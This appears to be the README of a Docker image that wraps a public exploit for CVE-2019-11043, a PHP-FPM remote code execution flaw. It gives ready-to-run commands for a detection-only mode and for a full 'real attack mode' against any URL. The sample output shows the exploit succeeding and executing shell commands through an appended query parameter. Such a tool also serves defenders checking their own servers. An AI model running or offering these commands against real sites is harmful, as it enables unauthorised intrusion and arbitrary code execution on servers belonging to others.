# Docker image and commands to check CVE-2019-11043

[![Build Status](https://travis-ci.org/ypereirareis/docker-CVE-2019-11043.svg?branch=master)](https://travis-ci.org/ypereirareis/docker-CVE-2019-11043)

* **CVE:** CVE-2019-11043
* **Description:** In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, thus opening the possibility of remote code execution.
* **Details :** https://nvd.nist.gov/vuln/detail/CVE-2019-11043
* **Github exploit:** https://github.com/neex/phuip-fpizdam

## Help

```bash
docker run --rm ypereirareis/cve-2019-11043
docker run --rm ypereirareis/cve-2019-11043 -h
```

## Check a website or URL

```bash
docker run --rm ypereirareis/cve-2019-11043 --only-qsl https://domain.tld/index.php
```

### Vulnerability result example:

https://github.com/neex/phuip-fpizdam#playground-environment

**Check mode only**

```bash
$ docker run --rm --net=host ypereirareis/cve-2019-11043 --only-qsl http://127.0.0.1:8080/script.php
2019/10/30 10:55:35 Base status code is 200
2019/10/30 10:55:35 Status code 502 for qsl=1765, adding as a candidate
2019/10/30 10:55:35 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2019/10/30 10:55:35 Detect() found QSLs and that's it
```

**Real attack mod**

```bash
$ docker run --rm --net=host ypereirareis/cve-2019-11043 http://127.0.0.1:8080/script.php 
2019/10/30 11:03:33 Base status code is 200
2019/10/30 11:03:33 Status code 502 for qsl=1765, adding as a candidate
2019/10/30 11:03:33 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2019/10/30 11:03:33 Attack params found: --qsl 1760 --pisos 55 --skip-detect
2019/10/30 11:03:33 Trying to set "session.auto_start=0"...
2019/10/30 11:03:33 Detect() returned attack params: --qsl 1760 --pisos 55 --skip-detect <-- REMEMBER THIS
2019/10/30 11:03:33 Performing attack using php.ini settings...
2019/10/30 11:03:33 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2019/10/30 11:03:33 Trying to cleanup /tmp/a...
2019/10/30 11:03:33 Done!
```

![Exploit](./img/exploit.jpg)

### No Vulnerability result example:

```bash
$ docker run --rm ypereirareis/cve-2019-11043 --only-qsl https://domain.tld/wp_admin.php
2019/10/28 09:41:30 Base status code is 200
2019/10/28 09:41:32 Detect() returned error: no qsl candidates found, invulnerable or something wrong
```

## Build the docker image

```bash
docker build -t ypereirareis/cve-2019-11043 .
```
